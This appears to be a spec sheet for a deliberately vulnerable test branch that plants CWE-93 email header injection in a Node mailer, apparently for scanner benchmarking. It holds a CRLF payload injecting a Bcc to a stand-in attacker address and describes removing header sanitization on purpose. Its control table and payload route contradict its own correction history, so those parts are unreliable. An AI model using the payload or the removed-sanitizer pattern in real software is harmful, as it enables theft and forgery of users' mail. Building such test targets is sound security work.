# email_header_injection — CRLF injection into composed mail headers

- Branch: `vuln/email_header_injection`
- Catalog row: 7
- Effort: S
- Hook: password reset mail
- Test file: `test/vulns/email_header_injection.test.mjs`

## Class and CWE

SMTP/Email header injection — CWE-93. Family: injection.

## Intent

Prove that a request value lands in a composed mail header without CR/LF
neutralization, so the caller can add headers the application never intended and
steal or forge mail.

## Affected surface

- Route: `POST /profile/email` — the handler mails the account's **current** address,
  which is where a stored header break reaches the composition step
- Parameter: none on the request. The injected bytes live in the stored `users.email`
  value; the request carries only the current password and the new address
- Prerequisites: `regular` profile (the account is signed in), and a stored address
  carrying the break
- Reachability: the e-mail form on `/profile`; every mail-composing route
  (reset, MFA, address-change) is a delivery path for the same stored value

## Sink

`src/mail/mailer.js` — `Mailer.send(to, subject, htmlBody)`. It composes `TO:` /
`SUBJECT:` lines for the `log` driver (the record format tests read) and `To:` /
`Subject:` lines for the `smtp` driver. On `main` both values are passed through
`headerValue()` — the exported C-MAIL-1 strip, `String(value).replace(/[\r\n\0]/g, '')`
— before composition. The branch removes those two calls and hands the values over
as they are.

## Baseline control removed

| Control | Control text (summary) | How the diff removes it |
|---|---|---|
| `C-MAIL-1` | Recipient and subject stripped of CR/LF before composition | `stripHeaderBreaks` is no longer called in `headersFor` |

## Minimal diff

Files touched:

- `src/mail/mailer.js` — `const recipient = headerValue(to)` and
  `const safeSubject = headerValue(subject)` in `Mailer.send()` become plain
  `String(...)` conversions, so both the `log` record and the `smtp` DATA block are
  composed from the values as stored. `headerValue()` itself stays exported (the
  unit proofs call it directly), which is why the `c-mail-1` cases are declared
  rather than left to pass.
- `test/vulns/email_header_injection.test.mjs` — new file.

## Payload sketch

```
POST /forgot-password
content-type: application/x-www-form-urlencoded

csrf_token=<token>&email=victim@theboard.local%0d%0aBcc:%20attacker@evil.example%0d%0aX-Pwned:%20yes
```

Expected effect: the composed record contains `Bcc: attacker@evil.example` and
`X-Pwned: yes` as their own header lines, so the message would be copied to the
attacker in a real SMTP run.

## Differential oracle

`test/vulns/email_header_injection.test.mjs`:

1. Point the mailer at a temp mail log (`MAIL_LOG` env var).
2. Post the payload with a valid CSRF token and a marker token inside the injected
   header value.
3. Read the last record and assert it contains a line that begins with `Bcc:` and
   contains the marker, and a line beginning with `X-Pwned:`.
4. Assert the record's own `TO:` line still names `victim@theboard.local`, so the
   injection added headers rather than replacing the recipient.

On `main` this test must fail because the CR/LF pair is stripped: the injected
text stays glued to the `TO:` line and no independent `Bcc:` line exists.

## Must-not-break invariants

- Inert probe gate (docs/04 §8): stays green on this branch.
- The reset flow still issues exactly one token and one mail record per request
  (`test/integration/hooks.test.mjs` reset-flow assertions).
- MFA code mail still renders in the PHP record format, and the existing
  `test/unit/mailer.test.mjs` cases (including its own CRLF-stripping case, which
  is the one control assertion skipped for this branch) behave as the sheet says.
- `test/security/baseline-inert.test.mjs` passes.
- Only `C-MAIL-1` is skipped.

## Fidelity to the PHP branch

Same class and same mechanism as the PHP target's mail branch: header composition
from request data. The Node mailer mirrors the PHP log-record format
(`docs/02` §4 B35), so the evidence — an injected header line inside a mail
record — is identical in both targets, and the SMTP driver composes the same
`To:`/`Subject:` lines PHP does.

## Carmentis evidence

Capture the `email` parameter with its `%0d%0a` payload and the injected
`Bcc:`/`X-Pwned:` lines from the mail log record. Expected label:
`CWE-93 / CRLF Injection in mail headers`. False-negative watch-out: the evidence
lives in the mail log (or an SMTP transcript), not in the HTTP response, which
returns a generic "if that address exists you will get a link" message on purpose.

## Definition of done

- [ ] `test/vulns/email_header_injection.test.mjs` passes on the branch.
- [ ] The same test fails when run from a `main` worktree.
- [ ] `npm run verify:branch` green.
- [ ] One commit off `main`; diff touches only the two listed files.
- [ ] Commit message: `vuln: email_header_injection — compose mail headers from request data without CR/LF stripping`.

## Correction history

The first version of this sheet was written before the substrate was read, and two
things in it were wrong.

- It named `headersFor(to, subject)` and `stripHeaderBreaks()`. Neither exists. The
  composition happens in `Mailer.send()`, and the C-MAIL-1 helper is the exported
  `headerValue()`.
- It put the payload in the `email` field of `POST /forgot-password`. That route mails
  only to an address that matches an account, and `validator.email`'s pattern
  (`EMAIL_PATTERN` in `src/security/validator.js`) rejects a value containing a line
  break — so no submitted payload can carry one, and a scanner fuzzing that field
  sees a normal "if that address exists you'll get a link" answer. The live source is
  the **stored** address: `POST /profile/email` mails the account's current address,
  so a `users.email` value holding a break is composed verbatim once the strip is
  gone. The reset and MFA routes are secondary delivery paths for the same stored
  value.

The consequence for scoring is honest and deliberate: the branch removes the last line
of defence, not the intake. An intake that could submit the payload would be a second
planted defect, and no other branch declares one.
